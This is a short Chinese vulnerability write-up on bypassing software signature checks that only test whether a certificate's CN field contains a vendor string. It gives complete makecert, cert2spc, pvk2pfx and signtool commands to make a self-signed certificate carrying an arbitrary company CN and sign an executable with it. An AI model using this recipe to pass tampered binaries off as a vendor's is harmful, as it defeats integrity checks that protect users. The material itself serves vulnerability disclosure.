---
title: 签名校验绕过漏洞
---
目前，应用一般都会对自研模块对文件进行签名，并在软件启动时候校验签名信息，以保证软件对完整性.一些软件厂商除了使用[WinVerifyTrust](https://learn.microsoft.com/en-us/windows/win32/api/wintrust/nf-wintrust-winverifytrust)校验签名有效性外，还会对签名对CN字段进行校验，以便确认该文件是否是预期对证书签发（因为攻击者可能使用泄漏到网络对合法签名证书进行签名）。但是，如果仅仅通过判断CN字段是否包含特定字段，则完全可以被绕过。

## 工具依赖

makecert.exe
cert2spc.exe
pvk2pfx.exe
signtool.exe
如果已经安装了微软对SDK，那么以上工具将会默认安装，不需要单独安装。推荐通过安装SDKi方式进行安装，以避免出现依赖缺少的n问题。
同时，为了方便使用，建议将以上工具路径添加到系统对环境变量。

## 生成自签名的根证书

makecert.exe -sv D:\mykey.pvk -n "CN=my company name" D:\myCert.cer -a SHA256
注意：如果CN字段包含特殊字符，比如英文的句号.逗号,，则需要使用转义符号\将整个CN包括起来。
比如，-n “CN=\"XXX Co., Ltd.\"”
该命令会弹出私钥保护口令，三次

## 创建spc文件

cert2spc.exe D:\myCert.cer D:\mycet.spc

## 将公钥和私钥合并成一个pfx格式对s证书文件

pvk2pfx.exe -pvk D:\mykey.pvk -pi password -spc D:\mycert.spc -pfx D:\mykey.pfx -po password

## 签署目标文件

signtool.exe sign /v /as /fd sha256 /f "mykey.pfx" /p "password" /tr http://timestamp.digicert.com "myfile.exe"